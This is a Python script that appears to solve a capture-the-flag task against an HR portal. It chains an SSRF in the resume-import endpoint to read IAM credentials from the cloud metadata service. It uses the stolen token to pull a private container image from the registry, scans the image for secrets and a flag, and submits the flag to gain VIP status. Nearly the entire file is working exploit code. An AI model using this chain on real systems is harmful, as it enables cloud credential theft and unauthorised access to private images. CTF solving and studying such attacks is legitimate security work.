#!/usr/bin/env python3
"""Task19: SSRF -> IAM -> private registry -> backend image -> VIP trigger."""

from __future__ import annotations

import argparse
import base64
import io
import json
import re
import shutil
import tarfile
import tempfile
from pathlib import Path, PurePosixPath
from typing import TYPE_CHECKING, Any

import requests

if TYPE_CHECKING:
    from collections.abc import Iterable, Iterator

DEFAULT_BASE = "https://hrportal-aoa51cvc.avitoctf.ru"
DEFAULT_IMAGE = "hrportal-backend"
IMDS_IAM = "http://169.254.169.254/latest/meta-data/iam/security-credentials/default"
FLAG_RE = re.compile(rb"avito\{[^}\r\n]{1,200}\}")
QUEUE_KEY_RE = re.compile(rb"mhq_v1_[0-9a-f]{32}")
TOKEN_RE = re.compile(r'"(?:Token|iamToken|iam_token)"\s*:\s*"([^"]+)"')


def nested_strings(value: Any):
    """Yield nested strings and recursively decode JSON strings."""
    if isinstance(value, str):
        yield value
        try:
            decoded = json.loads(value)
        except json.JSONDecodeError:
            return
        yield from nested_strings(decoded)
    elif isinstance(value, dict):
        for item in value.values():
            yield from nested_strings(item)
    elif isinstance(value, list):
        for item in value:
            yield from nested_strings(item)


def extract_iam_token(text: str) -> str:
    """Find the temporary IAM token inside the reflected SSRF response."""
    candidates = [text]
    try:
        candidates.extend(nested_strings(json.loads(text)))
    except json.JSONDecodeError:
        pass
    for candidate in candidates:
        match = TOKEN_RE.search(candidate)
        if match:
            return match.group(1)
    for candidate in candidates:
        match = re.search(r"\bt1\.[A-Za-z0-9_.-]{20,}\b", candidate)
        if match:
            return match.group(0)
    raise ValueError("IAM token not found in the reflected metadata response")


def cookie_from_file(path: Path | None, raw: str | None) -> str | None:
    """Build a Cookie header from curl's Netscape jar, unless raw was supplied."""
    if raw:
        return raw
    if path is None:
        return None
    pairs = []
    for raw_line in path.read_text().splitlines():
        line = raw_line.removeprefix("#HttpOnly_")
        fields = line.split("\t")
        if line and not line.startswith("#") and len(fields) >= 7:
            pairs.append(f"{fields[5]}={fields[6]}")
    if not pairs:
        raise ValueError(f"no cookies found in {path}")
    return "; ".join(pairs)


def leak_iam(session: requests.Session, base: str, cookie: str | None) -> str:
    """Use HRPortal's reflected SSRF to obtain a Yandex IAM token."""
    headers = {"Cookie": cookie} if cookie else {}
    response = session.post(
        f"{base.rstrip('/')}/api/seeker/resume/import",
        json={"url": IMDS_IAM},
        headers=headers,
        timeout=45,
    )
    print(f"[ssrf] HTTP {response.status_code}")
    try:
        token = extract_iam_token(response.text)
    except ValueError:
        response.raise_for_status()
        raise
    print(f"[ssrf] IAM token recovered ({len(token)} bytes)")
    return token


def registry_bearer(
    session: requests.Session,
    registry_base: str,
    iam_token: str,
    repository: str,
) -> str:
    """Exchange Yandex IAM authentication for a Registry v2 bearer token."""
    basic = base64.b64encode(f"iam:{iam_token}".encode()).decode()
    response = session.get(
        f"{registry_base.rstrip('/')}/v2/token/",
        params={"scope": f"repository:{repository}:pull"},
        headers={"Authorization": f"Basic {basic}"},
        timeout=30,
    )
    response.raise_for_status()
    body = response.json()
    token = body.get("token") or body.get("access_token")
    if not isinstance(token, str):
        raise ValueError(f"registry token missing: {body}")
    return token


def registry_get(
    session: requests.Session,
    registry_base: str,
    path: str,
    bearer: str,
    *,
    accept: str | None = None,
) -> requests.Response:
    """Perform an authenticated Registry v2 GET, following blob redirects."""
    headers = {"Authorization": f"Bearer {bearer}"}
    if accept:
        headers["Accept"] = accept
    response = session.get(f"{registry_base.rstrip('/')}{path}", headers=headers, timeout=90)
    response.raise_for_status()
    return response


def fetch_manifest(
    session: requests.Session,
    registry_base: str,
    repository: str,
    reference: str,
    bearer: str,
) -> dict[str, Any]:
    """Resolve an OCI index, preferring linux/amd64, to an image manifest."""
    accept = (
        "application/vnd.oci.image.index.v1+json, "
        "application/vnd.docker.distribution.manifest.list.v2+json, "
        "application/vnd.oci.image.manifest.v1+json, "
        "application/vnd.docker.distribution.manifest.v2+json"
    )
    response = registry_get(
        session,
        registry_base,
        f"/v2/{repository}/manifests/{reference}",
        bearer,
        accept=accept,
    )
    manifest = response.json()
    if "manifests" not in manifest:
        return manifest
    descriptors = manifest["manifests"]
    selected = next(
        (
            item
            for item in descriptors
            if item.get("platform", {}).get("os") == "linux"
            and item.get("platform", {}).get("architecture") == "amd64"
        ),
        descriptors[0],
    )
    return registry_get(
        session,
        registry_base,
        f"/v2/{repository}/manifests/{selected['digest']}",
        bearer,
        accept=accept,
    ).json()


def safe_member_name(name: str) -> PurePosixPath:
    """Validate an image-layer member name before extraction."""
    if name.startswith("/"):
        raise ValueError(f"unsafe layer path: {name!r}")
    while name.startswith("./"):
        name = name[2:]
    path = PurePosixPath(name)
    if path.is_absolute() or ".." in path.parts:
        raise ValueError(f"unsafe layer path: {name!r}")
    return path


def apply_layer(blob: bytes, rootfs: Path) -> list[tuple[str, bytes]]:
    """Apply one OCI tar layer and return regular-file bytes for secret scanning."""
    hits_source = []
    with tarfile.open(fileobj=io.BytesIO(blob), mode="r:*") as archive:
        ordinary = []
        for member in archive.getmembers():
            path = safe_member_name(member.name)
            if not path.parts:
                continue
            name = path.name
            parent = rootfs.joinpath(*path.parts[:-1])
            if name == ".wh..wh..opq":
                if parent.exists():
                    for child in parent.iterdir():
                        if child.is_dir() and not child.is_symlink():
                            shutil.rmtree(child)
                        else:
                            child.unlink(missing_ok=True)
                continue
            if name.startswith(".wh."):
                target = parent / name.removeprefix(".wh.")
                if target.is_dir() and not target.is_symlink():
                    shutil.rmtree(target, ignore_errors=True)
                else:
                    target.unlink(missing_ok=True)
                continue
            ordinary.append(member)
            if member.isfile():
                extracted = archive.extractfile(member)
                if extracted is not None:
                    hits_source.append((str(path), extracted.read()))
        archive.extractall(rootfs, members=ordinary, filter="data")
    return hits_source


def iter_rootfs_files(rootfs: Path) -> Iterator[tuple[str, bytes]]:
    """Yield final regular files after every OCI layer and whiteout was applied."""
    for path in rootfs.rglob("*"):
        if path.is_file() and not path.is_symlink():
            yield str(path.relative_to(rootfs)), path.read_bytes()


def scan_files(files: Iterable[tuple[str, bytes]]) -> dict[str, set[str]]:
    """Find the task flag, queue key, and queue prefix in extracted files."""
    result = {"flags": set(), "queue_keys": set(), "incoming": set()}
    for name, data in files:
        for match in FLAG_RE.findall(data):
            result["flags"].add(match.decode("ascii", "replace"))
        for match in QUEUE_KEY_RE.findall(data):
            result["queue_keys"].add(match.decode())
        if b"incoming/" in data:
            result["incoming"].add(name)
    return result


def apply_vip(
    session: requests.Session,
    base: str,
    cookie: str,
    flag: str,
    recaptcha_token: str,
) -> None:
    """Submit a resume containing the recovered trigger and verify is_vip."""
    resume = {
        "title": "Security Engineer",
        "full_name": "CTF Player",
        "city": "Медоедск",
        "salary": 1,
        "about": "image provenance audit",
        "experience": f"registry reverse: {flag}",
        "skills": "Go, containers",
        "contact": "ctf@example.invalid",
        "is_public": False,
        "recaptcha_token": recaptcha_token,
    }
    response = session.put(
        f"{base.rstrip('/')}/api/seeker/resume",
        json=resume,
        headers={"Cookie": cookie},
        timeout=30,
    )
    print(f"[vip] HTTP {response.status_code}: {response.text[:1000]}")
    response.raise_for_status()
    body = response.json()
    resume_body = body.get("resume", {}) if isinstance(body, dict) else {}
    is_vip = body.get("is_vip") if isinstance(body, dict) else None
    if is_vip is not True and (
        not isinstance(resume_body, dict) or resume_body.get("is_vip") is not True
    ):
        raise RuntimeError("server did not mark the resume as VIP")


def main() -> None:
    """CLI entry point."""
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--base", default=DEFAULT_BASE)
    parser.add_argument("--cookie")
    parser.add_argument("--cookie-file", type=Path)
    parser.add_argument("--iam-token", help="skip the SSRF stage")
    parser.add_argument("--registry-id", required=False)
    parser.add_argument("--registry-base", default="https://cr.yandex")
    parser.add_argument("--image", default=DEFAULT_IMAGE)
    parser.add_argument("--reference", default="latest")
    parser.add_argument("--rootfs", type=Path, default=Path("task19/rootfs-rebuilt"))
    parser.add_argument("--apply-vip", action="store_true")
    parser.add_argument(
        "--recaptcha-token",
        default="",
        help="needed only if PDF beta is enabled for this seeker account",
    )
    parser.add_argument("--self-test", action="store_true")
    args = parser.parse_args()

    if args.self_test:
        fixture = 'outer {"content":"{\\"Token\\":\\"t1.fixture-token-12345678901234567890\\"}"}'
        assert extract_iam_token(fixture).startswith("t1.fixture")
        assert scan_files(
            [("app", b"avito{fixture} mhq_v1_0123456789abcdef0123456789abcdef incoming/")]
        )["flags"] == {"avito{fixture}"}
        for unsafe in ("../escape", "../../escape", "/absolute"):
            try:
                safe_member_name(unsafe)
            except ValueError:
                pass
            else:
                raise AssertionError(f"unsafe path accepted: {unsafe}")
        with tempfile.TemporaryDirectory(prefix="task19-selftest-") as tmp:
            rootfs = Path(tmp)
            jar = rootfs / "cookies.txt"
            jar.write_text("#HttpOnly_.example.test\tTRUE\t/\tFALSE\t0\tsession\tfixture\n")
            assert cookie_from_file(jar, None) == "session=fixture"
            jar.unlink()
            layer = io.BytesIO()
            with tarfile.open(fileobj=layer, mode="w") as archive:
                payload = b"avito{fixture-final} mhq_v1_0123456789abcdef0123456789abcdef"
                member = tarfile.TarInfo("./app/hrportal-api")
                member.size = len(payload)
                archive.addfile(member, io.BytesIO(payload))
            apply_layer(layer.getvalue(), rootfs)
            assert scan_files(iter_rootfs_files(rootfs))["flags"] == {"avito{fixture-final}"}
        print("self-test: OK")
        return
    if not args.registry_id:
        parser.error("--registry-id is required (REGISTRY_ID from task18 user-data)")

    cookie = cookie_from_file(args.cookie_file, args.cookie)
    repository = f"{args.registry_id}/{args.image}"
    with requests.Session() as session:
        iam_token = args.iam_token or leak_iam(session, args.base, cookie)
        bearer = registry_bearer(session, args.registry_base, iam_token, repository)
        print("[registry] bearer acquired")
        manifest = fetch_manifest(session, args.registry_base, repository, args.reference, bearer)
        layers = manifest.get("layers", [])
        if not layers:
            raise ValueError(f"manifest has no layers: {manifest}")
        if args.rootfs.exists():
            shutil.rmtree(args.rootfs)
        args.rootfs.mkdir(parents=True)
        for number, descriptor in enumerate(layers, 1):
            digest = descriptor["digest"]
            print(f"[layer {number}/{len(layers)}] {digest}")
            blob = registry_get(
                session,
                args.registry_base,
                f"/v2/{repository}/blobs/{digest}",
                bearer,
            ).content
            apply_layer(blob, args.rootfs)
        findings = scan_files(iter_rootfs_files(args.rootfs))
        print(json.dumps({key: sorted(value) for key, value in findings.items()}, indent=2))
        flags = sorted(findings["flags"])
        if not flags:
            raise RuntimeError("no avito{...} trigger found in the image")
        print(f"FLAG / VIP trigger: {flags[0]}")
        if args.apply_vip:
            if not cookie:
                parser.error("--apply-vip also requires --cookie or --cookie-file")
            apply_vip(session, args.base, cookie, flags[0], args.recaptcha_token)


if __name__ == "__main__":
    main()
